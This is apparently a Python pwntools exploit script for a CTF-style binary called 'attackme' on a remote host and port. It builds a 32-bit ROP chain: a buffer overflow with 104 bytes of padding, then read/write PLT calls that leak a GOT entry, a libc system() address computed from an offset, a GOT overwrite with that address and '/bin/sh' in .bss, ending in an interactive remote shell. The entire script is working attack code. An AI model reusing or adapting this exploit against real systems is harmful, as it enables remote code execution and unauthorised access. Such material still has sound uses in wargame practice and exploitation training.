from pwn import *

p = remote("223.194.105.182", 37100)

elf = ELF("attackme")
libc = ELF("./libc-2.23.so")
rop = ROP(elf)

command = "/bin/sh"
offset = 0x9abe0
dynamic = elf.bss()

read_plt = elf.plt['read']
write_plt = elf.plt['write']
read_got = elf.got['read']
write_got = elf.got['write']

libc_read_symbols = libc.symbols['read']
libc_system_symbols = libc.symbols['system']

pppr = 0x80485f9
print "[*] libc_read_symbols = %s" %hex(libc_read_symbols)
print "[*] libc_system_symbols = %s" %hex(libc_system_symbols)

print "[*] read_plt : %s" %hex(read_plt)
print "[*] read_got : %s" %hex(read_got)
print "[*] write_plt : %s" %hex(write_plt)
print "[*] write_got : %s" %hex(write_got)


print p.recv(1024)

payload = ""
payload += "a"*104
payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(dynamic)
payload += p32(8)

payload += p32(write_plt)
payload += p32(pppr)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)

payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(read_got)
payload += p32(4)

payload += p32(read_plt)
payload += "aaaa"
payload += p32(dynamic)

p.sendline(payload)
p.success("Sended Payload!")
print p.recv(2048)
p.sendline(command)

read_libc = u32(p.recv(4))
system_libc = read_libc - offset


p.success("read_libc : %s" %hex(read_libc))
p.success("system_libc : %s" %hex(system_libc))


p.sendline(p32(system_libc))
p.interactive()
print p.recv(1024)
